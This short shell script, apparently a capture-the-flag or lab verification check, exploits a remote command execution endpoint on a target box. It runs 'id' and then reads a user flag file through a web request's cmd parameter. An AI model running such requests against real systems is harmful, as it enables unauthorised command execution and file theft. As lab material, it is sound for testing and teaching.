#!/bin/sh
# Prove the RCE from an unprivileged attacker context: execute commands via the
# web endpoint and read the user flag.
set -eu
u="${BOX_WEB_USER:?BOX_WEB_USER is not set}"

id_out=$(curl -fsS "http://${BOX_HOST}:8080/run?cmd=id")
echo "$id_out"
echo "$id_out" | grep -q 'uid=' || { echo "command execution failed" >&2; exit 1; }

flag=$(curl -fsS "http://${BOX_HOST}:8080/run?cmd=cat%20/home/${u}/user.txt")
echo "$flag"
echo "$flag" | grep -q 'FLAG{user-' || { echo "user flag not readable via RCE" >&2; exit 1; }
